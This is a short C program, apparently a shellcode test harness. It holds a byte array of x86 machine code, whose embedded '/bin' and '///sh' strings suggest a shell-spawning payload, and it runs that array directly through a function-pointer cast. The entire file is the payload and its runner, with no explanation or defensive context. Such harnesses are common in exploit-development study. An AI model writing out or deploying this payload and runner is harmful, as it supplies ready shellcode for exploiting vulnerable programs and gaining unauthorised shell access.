#include <stdio.h>

int main()
{
    unsigned char shellcode[] = { 0x6A, 0x68, 0x68, 0x2F, 0x2F, 0x2F, 0x73, 0x68, 0x2F, 0x62, 0x69, 0x6E, 0x54, 0x5B, 0x52, 0x58, 0x6A, 0x53, 0x5A, 0x28, 0x50, 0x27, 0x28, 0x50, 0x28, 0x6A, 0x70, 0x5A, 0x30, 0x50, 0x28, 0x51, 0x58, 0x51, 0x5A, 0x34, 0x2B, 0x34, 0x20, 0x20, 0x43 };

    (*(void (*)())shellcode)();

    return 0;
}